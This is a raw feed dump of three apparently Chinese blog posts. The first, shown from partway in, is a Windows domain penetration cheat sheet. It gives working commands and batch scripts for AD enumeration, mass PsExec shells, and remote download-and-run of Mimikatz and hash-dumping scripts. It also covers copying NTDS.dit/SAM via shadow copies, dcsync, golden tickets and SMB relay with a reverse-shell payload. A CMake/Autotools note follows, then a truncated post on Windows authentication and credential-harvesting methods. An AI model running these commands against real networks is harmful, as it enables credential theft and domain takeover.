class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all查询本机IP段，所在域等</span><br><span class="line">net config Workstation当前计算机名，全名，用户名，系统版本，工作站域，登陆域</span><br><span class="line">net user本机用户列表</span><br><span class="line">net localhroup administrators本机管理员[通常含有域用户]</span><br><span class="line">net user /domain查询域用户</span><br><span class="line">net user 用户名 /domain获取指定用户的账户信息</span><br><span class="line">net group /domain查询域里面的工作组</span><br><span class="line">net group 组名 /domain查询域中的某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain查询域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; /domain获得企业管理员列表</span><br><span class="line">net group 组名 /del /domain删除域中的某组</span><br><span class="line">net group 组名 组成员名 /del /domain删除域中的某组的组成员</span><br><span class="line">net localgroup administrators /domain登录本机的域管理员</span><br><span class="line">net group 组名 /add增加域中的组</span><br><span class="line">net localgroup administrators workgroup\user001 /add域用户添加到本机</span><br><span class="line">net group &quot;domain controllers&quot; /domain查看域控制器(如果有多台)</span><br><span class="line">net time /domain判断主域，主域服务器都做时间服务器</span><br><span class="line">net session查看当前会话</span><br><span class="line">net use \\ip\ipc$ pawword /user:username@domain建立IPC会话[空连接-***]</span><br><span class="line">net use z: \\192.168.200.21\文件夹名建立映射到本机Z盘</span><br><span class="line">net share查看SMB指向的路径[即共享]</span><br><span class="line">at \\192.168.200.2  0：00 c:\windows\muma.exe在共享主机上执行</span><br><span class="line">net view查询同一域内机器列表</span><br><span class="line">net view /domain查询域列表</span><br><span class="line">net view /domain:M0RK查看test域中计算机列表</span><br><span class="line">net view \\域控的机器名查看域控共享情况</span><br><span class="line">nltest /domain_trusts获取域信任信息</span><br><span class="line">net session查看当前会话</span><br><span class="line">net start查看当前运行的服务</span><br><span class="line">net time /domain查询主域服务器的时间</span><br><span class="line">echo %logonserver%查看登录认证的机器(即域控机器)</span><br><span class="line">net accounts查看本地密码策略</span><br><span class="line">net accounts /domain查看域密码策略</span><br><span class="line">query user   查看当前的登录信息</span><br><span class="line">netsh firewall show config查看防火墙策略</span><br><span class="line">netsh firewall show state查看防火墙策略</span><br><span class="line">route print路由表</span><br><span class="line">tracert IP路由跟踪</span><br><span class="line">arp -a列出本网段内所有活跃的IP地址</span><br><span class="line">arp -s (ip + mac)绑定mac和IP</span><br><span class="line">arp -d (iP + mac)解绑IP和Mac</span><br><span class="line">tasklist /V查看进程[显示对应用户]</span><br><span class="line">tasklist /S ip /U domain\username /P /V查看远程计算机进程列表</span><br><span class="line">tasklist /S IP地址 /U 域名\用户名 /P /V查看远程计算机进程</span><br><span class="line">tasklist /svc查看进程</span><br><span class="line">taskkill /im 进程名称(cmd.exe)结束进程</span><br><span class="line">taskkill /pid[进程码]-t(结束该进程) -f(强制结束该进程以及所有子进程)</span><br><span class="line">qprocess *类似tasklist</span><br><span class="line">qprocess /SERVER:IP远程查看计算机进程列表</span><br><span class="line">whoami /all查询当前用户权限等</span><br><span class="line">set查看系统环境变量</span><br><span class="line">systeminfo查看系统信息</span><br><span class="line">qwinsta查看登录情况</span><br><span class="line">fsutil fsinfo drives查看所有盘符</span><br><span class="line">wmic bios查看bios信息</span><br><span class="line">wmic qfe查看补丁信息</span><br><span class="line">wmic qfe get hotfixid查看补丁-Patch号，很实用</span><br><span class="line">wmic share get name,path查看SMB指向路径</span><br><span class="line">net view /domain</span><br><span class="line">net config workstation</span><br><span class="line">net group &quot;Domain Admins&quot; /domain</span><br><span class="line">net time /domain</span><br><span class="line">ipconfig /all</span><br><span class="line">nslookup xxx</span><br><span class="line">dsquery server</span><br><span class="line"></span><br><span class="line">查看域控制器</span><br><span class="line">net group &quot;Domain controllers&quot;</span><br><span class="line"></span><br><span class="line">查询所有计算机名称(windows 2003)</span><br><span class="line"></span><br><span class="line">dsquery computer</span><br><span class="line"></span><br><span class="line">下面这条查询的时候,域控不会列出</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Computers&quot; /domain</span><br></pre></td></tr></table></figure></li><li><p>查找域控<br>1.dsquery server(或者net group “domain controllers” /domain命令)查找到主机名，然后ping一下主机名，得到的ip一般就是域控机器的ip地址了。<br>2.使用nslookup命令  _ldap._tcp.dc._msdcs.domainname<br>3.nltest /dclist:domainname<br><img src="/2017/09/28/windows域安全/finddc.png" alt=""><br>4.cobaltstrike的net  dclist直接定位到dc<br>或者使用powershell的powerview 获取域当前的信息<br>5.adfind、ldifde、adexplorer等工具<br><img src="/2017/09/28/windows域安全/adfind.png" alt=""><br>…</p></li><li>常见脚本<br><a href="https://pentestlab.blog/2018/05/28/situational-awareness/" target="_blank" rel="noopener">https://pentestlab.blog/2018/05/28/situational-awareness/</a><h2 id="搞定域控"><a href="#搞定域控" class="headerlink" title="搞定域控"></a>搞定域控</h2>1.ms14-068 将普通域用户权限提升为域控权限<br><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a><br>2.查看哪些主机上存在域管理员的活动会话，找到域管登陆过的机器，进而抓取域管的密码或者哈希。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">## 批量返回shell</span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">echo check ip addr config file…</span><br><span class="line"></span><br><span class="line">if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end</span><br><span class="line"></span><br><span class="line">echo read and analysis file…</span><br><span class="line"></span><br><span class="line">for /F &quot;eol=#&quot; %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p &quot;PASSWORD&quot; cmd </span><br><span class="line"></span><br><span class="line">:end</span><br><span class="line">## 用指定的用户名和密码去遍历ip.txt中的IP列表，并打印任务列表，将结果输出到result.txt当中，执行完了上述批处理，我们只需要稍作等待，最后去查看result.txt当中是否含有域管理员用户名，即可确定哪些主机上存在域管理员的活动会话</span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">echo check ip addr config file…</span><br><span class="line"></span><br><span class="line">if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end</span><br><span class="line"></span><br><span class="line">echo read and analysis file…</span><br><span class="line"></span><br><span class="line">for /F &quot;eol=#&quot; %%i in (ip.txt) do echo %%i &amp;(echo %%i &amp;tasklist /s %%i /u administrator /p &quot;PASSWORD&quot; /v) &gt;&gt;d:\result.txt</span><br><span class="line"></span><br><span class="line">:end</span><br><span class="line"></span><br><span class="line">exit</span><br></pre></td></tr></table></figure></li></ul><h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p><img src="/2017/09/28/windows域安全/passhash.png" alt=""><br>哈希传递的工具可参考文章 <a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">域渗透——Pass The Hash的实现</a></p><h2 id="PTT-silver-ticket"><a href="#PTT-silver-ticket" class="headerlink" title="PTT-silver ticket"></a>PTT-silver ticket</h2><p><img src="/2017/09/28/windows域安全/silverticket.png" alt=""><br><img src="/2017/09/28/windows域安全/machinentlm.png" alt=""></p><ul><li>注意这里机器的NTLM 是关键，域sid都是一样的  <h2 id="PTT-golden-ticket"><a href="#PTT-golden-ticket" class="headerlink" title="PTT-golden ticket"></a>PTT-golden ticket</h2></li><li>域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的，因此只要拿到了krbtgt的密码Hash，就可以随意伪造Ticket，进而使用Ticket登陆域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket，此类攻击方法被称为票据传递攻击。<br><img src="/2017/09/28/windows域安全/krbtgt1.png" alt=""></li><li>获取krbtgt账号ntlm命令是Lsadump::dcsync  /user:krbtgt <h2 id="抓密码或hash"><a href="#抓密码或hash" class="headerlink" title="抓密码或hash"></a>抓密码或hash</h2></li><li><p>通过powershell抓取某台机器的明文密码或者哈希</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#抓明文</span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1′); Invoke-Mimikatz –DumpCerts</span><br><span class="line">#抓哈希</span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1′);Get-PassHashes</span><br></pre></td></tr></table></figure></li><li><p>dump域数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">vssadmin Create Shadow /for=C：        创建新的卷影副本</span><br><span class="line">成功地创建了 &apos;C:\&apos; 的卷影副本</span><br><span class="line">   卷影副本 ID: &#123;ad7dfdec-a8db-4fa3-b2e6-7e1ab1bad2b4&#125;</span><br><span class="line">   卷影副本卷名: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3</span><br><span class="line"></span><br><span class="line">执行程序：</span><br><span class="line">\\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\test\psexec.exe</span><br><span class="line">1.需要先创建好目录，并放入木马或程序</span><br><span class="line">2.再创建新的卷影副本,利用卷影副本卷名来执行程序，并把卷影副本卷名中的 &quot;?&quot; 需要改为 &quot;.&quot;号执行程序</span><br><span class="line"></span><br><span class="line">Copy Files</span><br><span class="line">有些系统运行中的文件是不可复制的，比如像SAM</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM C:\</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\</span><br><span class="line"></span><br><span class="line">PowerShell调用方法：</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -ComputerName SERVER -localDestination &quot;C:\temp\SYSTEM&quot;</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\NTDS\NTDS.dit&quot; -ComputerName SERVER -localDestination &quot;C:\temp\NTDS.dit&quot;</span><br><span class="line">需要文件：</span><br><span class="line">https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy</span><br><span class="line"></span><br><span class="line">vssadmin Delete Shadows /shadow=&#123;ce51aaf6-5677-4423-86ac-45d064ef626e&#125; /quiet        删除卷影副本</span><br><span class="line">vssadmin Delete Shadows /For=C:</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters        查询NTDS路径</span><br><span class="line">获取域数据库</span><br><span class="line">Windows\NTDS\ntds.dit</span><br><span class="line">Windows\System32\config\SYSTEM</span><br><span class="line">Windows\System32\config\SAM</span><br><span class="line"></span><br><span class="line">NTDSDump导出域数据库hash值：</span><br><span class="line">NTDSDump.exe -f ntds.dit -s SYSTEM -h -t john -o save.txt</span><br><span class="line">或者：</span><br><span class="line">QuarksPwDump.exe</span><br><span class="line">QuarksPwDump --dump-hash-domain --with-history        导出本机域控历史hash值</span><br></pre></td></tr></table></figure></li></ul><p><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="noopener">更多</a></p><h2 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h2><h3 id="windows中的Credential-Manager的信息获取"><a href="#windows中的Credential-Manager的信息获取" class="headerlink" title="windows中的Credential Manager的信息获取"></a>windows中的Credential Manager的信息获取</h3><ul><li>Credential Manager，中文翻译为凭据管理器，用来存储凭据(例如网站登录和主机远程连接的用户名密码)。</li><li>如果用户选择存储凭据，那么当用户再次使用对应的操作，系统会自动填入凭据，实现自动登录<br><img src="/2017/09/28/windows域安全/cmdkey.png" alt=""></li><li>凭据类别包含两种，分别为Domain Credentials和Generic Credentials。</li><li>凭据读取 mimikatz和powershell脚本<br><img src="/2017/09/28/windows域安全/mimikatzdumpcredman.png" alt=""><br>更多可参考<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%ADCredential-Manager%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/" target="_blank" rel="noopener">Windows中Credential Manager的信息获取</a><h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><a href="https://github.com/SpiderLabs/scavenger" target="_blank" rel="noopener">横向渗透信息搜集工具</a><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><h3 id="SMB共享枚举"><a href="#SMB共享枚举" class="headerlink" title="SMB共享枚举"></a>SMB共享枚举</h3></li><li><p><a href="https://github.com/ShawnDEvans/smbmap" target="_blank" rel="noopener">SMBMap</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/# smbmap -H [ip] -d [domain] -u [user] -p [password]</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] User SMB session establishd on [ip]...</span><br><span class="line">[+] IP: [ip]:445        Name: [ip]                                      </span><br><span class="line">        Disk                                                    Permissions</span><br><span class="line">        ----                                                    -----------</span><br><span class="line">        ADMIN$                                                  NO ACCESS</span><br><span class="line">        C$                                                      NO ACCESS</span><br><span class="line">        IPC$                                                    NO ACCESS</span><br><span class="line">        NETLOGON                                                READ ONLY</span><br><span class="line">        Replication                                             READ ONLY</span><br><span class="line">        SYSVOL                                                  READ ONLY</span><br></pre></td></tr></table></figure></li><li><p>使用nmap </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script smb-enum-shares -p 139,445 [ip]</span><br></pre></td></tr></table></figure></li></ul><h3 id="查看SMB的漏洞"><a href="#查看SMB的漏洞" class="headerlink" title="查看SMB的漏洞"></a>查看SMB的漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script smb-vuln* -p 139,445 [ip]</span><br></pre></td></tr></table></figure><h3 id="trick4-smbrelay"><a href="#trick4-smbrelay" class="headerlink" title="trick4 smbrelay"></a>trick4 smbrelay</h3><p>python smbrelayx.py -h 172.24.243.59（被攻击的机器） -e smb_rev.exe<br><img src="/2017/09/28/windows域安全/smbrelay.png" alt=""><br><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/smbrelayx.py" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket/blob/master/examples/smbrelayx.py</a><br><a href="http://www.91ri.org/9022.html" target="_blank" rel="noopener">再谈SMB中继攻击</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Cmake VS Autotools</title>
      <link href="/2017/09/28/CmakeVSautotools/"/>
      <url>/2017/09/28/CmakeVSautotools/</url>
      <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近的项目中遇到了cmake和autotools的转换的问题，这两个东西以前接触的很少，所以需要对cmake和autotools进行一番系统学习。<br></p><h4 id="Cmake使用"><a href="#Cmake使用" class="headerlink" title="Cmake使用"></a>Cmake使用</h4><ul><li><a href="https://www.wikiwand.com/en/CMake" target="_blank" rel="noopener">wiki关于cmake介绍</a></li><li><a href="https://cmake.org/documentation/" target="_blank" rel="noopener">官方文档</a> 熟悉某种技术的最好最快的方法还是要通过阅读官方文档:P</li><li><a href="https://www.gitbook.com/book/tuannguyen68/learning-cmake-a-beginner-s-guide/details" target="_blank" rel="noopener">learning-cmake-a-beginner-s-guide/details</a></li><li><a href="http://www.hahack.com/codes/cmake/" target="_blank" rel="noopener">CMake 入门实战</a></li><li>windows下使用<br><img src="/2017/09/28/CmakeVSautotools/cmake.png" alt=""><h4 id="Cmake-语法简单介绍"><a href="#Cmake-语法简单介绍" class="headerlink" title="Cmake 语法简单介绍"></a>Cmake 语法简单介绍</h4>可以把cmake理解为一种简单的语言，它也有着它的语法和变量。它的语法规则很简单<br><br>1.变量使用${}方式取值<br><br>2.指令（参数1 参数2 。。。）<br><br>3.指令是大小写无关的，参数和变量是大小写敏感的，例如set 和SET 作为指令都是可以的，但是建议全部使用大写的指令。<br><br>4.cmake的语法还是比较灵活且考虑到了各种情况，比如SET(SOURCES_FILES main.c)也可以写成SET(SOURCES_FILES “main.c”)，但是假设一个源文件中的文件名是fu nc.c（中间有了空格），这个时候就有必要加上双引号了。<br><br>5.清理工程，跟经典的autotools系列工具一样，make clean可以对构建结果进行清理。<br><br>6.内部构建和外部构建。内部构建就是直接在根目录下面构建(会在工程目录下产生很多文件，使工程看起来比较乱)，而使用外部构建比如在工程目录下面创建一个build的目录，然后进入build目录下，进行cmake .. 这样生成的文件都在build目录下。推荐是有外部构建，所以一般的构建命令就是进入 build 目录下面，然后 cmake ..  make<br>7.注意cmake 是构建项目的过程,是产生Makefile的过程，也就是生成编译指令的过程，这个过程不会包编译的错误。make才是编译和链接的过程，如果你的代码有问题，或者你的编译指令有有问题(比如未包含动态或者静态的lib)这是时候会产生错误。<br><br>8.ADD_LIBRARY()用来生成动态或者静态链接库的。INCLUDE_DIRECTORY()是用来向工程添加多个特定的头文件搜索路径的，路径之间用空格分开，如果路径中包含了空格，可以使用双引号将它括起来。默认的行为是追加到当前的头文件搜索路径的后面。LINK_DIRECTORIES()添加非标准的共享库搜索路径，TARGET_LINK_LIBRARIES(target  library1 library2),这个指令可以用来为target添加需要连接的共享库.<br><br><img src="/2017/09/28/CmakeVSautotools/makeparam.png" alt=""><br><br><img src="/2017/09/28/CmakeVSautotools/linklib.png" alt=""><br><a href="https://github.com/kevien/cmakesample" target="_blank" rel="noopener">测试代码见github</a><h4 id="autotools使用"><a href="#autotools使用" class="headerlink" title="autotools使用"></a>autotools使用</h4></li><li><a href="https://geesun.github.io/posts/2015/02/autotool.html" target="_blank" rel="noopener">使用autotools生成Makefile学习笔记</a></li><li><a href="http://leolovenet.com/downloads/files/autotools.pdf" target="_blank" rel="noopener">autotools入门</a><h4 id="使用libtool创建库"><a href="#使用libtool创建库" class="headerlink" title="使用libtool创建库"></a>使用libtool创建库</h4><a href="https://www.ibm.com/developerworks/cn/aix/library/1007_wuxh_libtool/index.html" target="_blank" rel="noopener">使用libtool创建库</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><a href="https://github.com/darx0r/SC-A-Make" target="_blank" rel="noopener">cmake导致的命令执行问题</a><br><a href="http://thebigdoc.readthedocs.io/en/latest/auto-make-conf.html" target="_blank" rel="noopener">automake 和 autoconf 使用简明教程</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://www.youtube.com/watch?v=gYmgbqGfv-8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gYmgbqGfv-8</a><br><a href="https://stackoverflow.com/questions/7132862/tutorial-for-converting-autotools-to-cmake" target="_blank" rel="noopener">https://stackoverflow.com/questions/7132862/tutorial-for-converting-autotools-to-cmake</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>windows认证机制以及常见密码获取工具分析</title>
      <link href="/2017/09/20/windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/"/>
      <url>/2017/09/20/windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul><li>先来了解一下lsass进程。<br>Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens.<a href="https://www.wikiwand.com/en/Local_Security_Authority_Subsystem_Service" target="_blank" rel="noopener">link</a></li><li>NTLM</li><li>Kerberos<h2 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h2></li><li>SAM security account manager 账户安全管理。存放位置<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%/system32/config/SAM</span><br><span class="line"> HKEY_LOCAL_MACHINE\SAM</span><br></pre></td></tr></table></figure></li></ul><p>Windows一旦启动 无法读取，但是可以通过读取内存的方法进行读取。<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/sam.png" alt=""><br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/regeditsam.png" alt=""></p><ul><li>这里有个点就是rid劫持(修改F键中值F5位F4)<br><a href="https://www.youtube.com/watch?v=hilLHF37ng8" target="_blank" rel="noopener">rid劫持参考</a><h2 id="LM-hash、NTLM-hash和NetNTLM"><a href="#LM-hash、NTLM-hash和NetNTLM" class="headerlink" title="LM hash、NTLM hash和NetNTLM"></a>LM hash、NTLM hash和NetNTLM</h2></li><li><p>在Windows系统中，比较常见是从系统导出来的NTLM hash，通过Hashcat能够破解出明文密码。</p></li><li><p>Hashcat支持超过200种高度优化的hash算法，其中和NTLM hash相关的有4个，分别为NetNTLMv1、NetNTLMv1+ESS、NetNTLMv2和NTLM。Hashcat支持的哈希算法：<a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p></li><li><p>自Windows Vista和Windows Server 2008开始,Windows取消LM hash,但某些工具的参数需要填写固定格式LM hash:NT hash，可以将LM hash填0(LM hash可以为任意值)，即00000000000000000000000000000000:NT hash</p></li><li><p>NTHash (又称作NTLM)，现代操作系统都是用的这种格式密码，我们可以通过dump SAM文件或者使用mimikatz获取到，此外它还存在于域控机器的NTDS文件中。这些哈希值可以用来进行哈希传递攻击。<br>算法是 MD4(UTF-16-LE(password))  NTLM哈希长度为32位。</p></li><li><p>Net-NTMLv1/v2 是指网络环境下NTLM认证中的哈希，也可使用hashcat进行破解。</p></li><li><p>Net-NTLM hash在渗透测试中，通常有以下两种利用方法<br>1.使用中间人攻击的方式来获取Net-NTLM hash，常用工具为Responder和Inveigh，方法见<a href="https://github.com/incredibleindishell/Windows-AD-environment-related/tree/master/Responder" target="_blank" rel="noopener">How to use responder tool to perform exploitation in windows environment by stealing NTLMv2 hashes.</a><br>2.通过多种方式强制目标客户端向伪造的服务器发起SMB连接，在伪造的服务器上捕获数据包，获得Net-NTLM hash<br><a href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍</a><br><a href="http://www.mannulinux.org/2018/12/how-to-steal-ntlmv2-hashes-using-file.html" target="_blank" rel="noopener">How to steal NTLMv2 hashes using file download vulnerability in web application</a><br><a href="https://www.hackingarticles.in/capture-ntlm-hashes-using-pdf-bad-pdf/" target="_blank" rel="noopener">Capture NTLM Hashes using PDF (Bad-Pdf)</a></p><h2 id="获取明文密码的几种方式"><a href="#获取明文密码的几种方式" class="headerlink" title="获取明文密码的几种方式"></a>获取明文密码的几种方式</h2></li><li>虽然在内网中可以通过PTH或者PTK就可以进行横向渗透，但是只能通过命令行进行操作，但当你有了明文密码时候就可以可以直接登录web、vpn、远程桌面等。<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3></li><li>Group Policy Preference,<br><a href="https://www.youtube.com/watch?v=wT4aemT9SZQ" target="_blank" rel="noopener">参考</a><h3 id="mimikatz的lsass-mimidumps"><a href="#mimikatz的lsass-mimidumps" class="headerlink" title="mimikatz的lsass mimidumps"></a>mimikatz的lsass mimidumps</h3></li><li>首先可以使用ProcDump工具将lsass进程内存dump出来，使用mimikatz也可以直接获取用户明文密码或哈希，但是可能会被杀软给查杀。此外在windows高版本(NT6)上还可以通过任务管理器中的创建存储文件进行lsass进程内存dump。</li><li>通过mimikatz导入dump的内存文件，进行解密.<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/procdump.png" alt=""><br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/createdump.png" alt=""><br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/minidump.png" alt=""><br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/minidump1.png" alt=""><h3 id="WDigest"><a href="#WDigest" class="headerlink" title="WDigest"></a>WDigest</h3></li><li>Digest认证最早出现在windows XP中，主要用来<a href="https://technet.microsoft.com/en-us/library/cc778868(v=ws.10" target="_blank" rel="noopener">HTTP和SASL认证</a>.aspx),它会在本地保存明文密码。在2014年微软打了个<a href="https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a" target="_blank" rel="noopener">补丁</a>用来去禁止保存用户密码，但是很多服务器和PC并没有禁止WDigest。<h3 id="可逆加密"><a href="#可逆加密" class="headerlink" title="可逆加密"></a>可逆加密</h3></li><li><h2 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h2><h3 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h3></li><li>NTLM认证是Challenge – Response 模式<br>在使用NTLM协议时，客户端发送用户名到服务器端；服务器生成一个challenge并发送给客户端；客户端使用用户的密码来加密这个challenge，然后发送response到服务器端。如果该账号是一个本机账号，那么服务器使用Security Account Manager来验证用户；如果账号是一个域账号，那么服务器把这个response请求转送到域控制器(DC)上来让域控制器调用组安全策略来做用户认证，然后服务器就可以构建一个安全令牌并建立一个session。<h2 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h2><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/kerberos.png" alt=""></li><li>Kerberos认证提供一种服务器和客户端相互认证的机制。Kerberos包含了三个关键组件：Key Distribution Center (KDC)，客户端用户，和一个运行所需服务的服务器。KDC是域控制器的一部分，它执行两个任务：认证服务(AS)和票据许可服务(TGS)。当客户端用户登录到网络上时，它会向用户所在域的AS去请求一个“票据请求票据”（TGT）。然后，当客户端想要访问网络上的某个资源的话，它就出示以下东西：TGT，认证码，Server Principal Name（SPN）；有了这些东西，客户端就可以从服务所在的域中的TGS获得session票据。使用这个session票据，客户端就可以和网络上的服务进行交流，该服务会验证“认证码”然后创建一个访问令牌给客户端用户，接下来客户端就可以登录上该服务了。</li><li>相比kerberos，https可能更为熟悉一点，通过证书和非对称加密的方式，让客户端可以安全的访问服务端，但这仅仅是客户端安全，通过校验，客户端可以保证服务端是安全可靠的，而服务端却无法得知客户端是不是安全可靠的。这也是互联网的一种特性。而kerberos可以支持双向认证，就是说，可以保证客户端访问的服务端是安全可靠的，服务端回复的客户端也是安全可靠的。<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/klist.png" alt=""></li><li>klist 命令显示 Kerberos 凭证高速缓存或密钥表的内容。<h3 id="SPN-service-principal-name-扫描"><a href="#SPN-service-principal-name-扫描" class="headerlink" title="SPN(service principal name) 扫描"></a>SPN(service principal name) 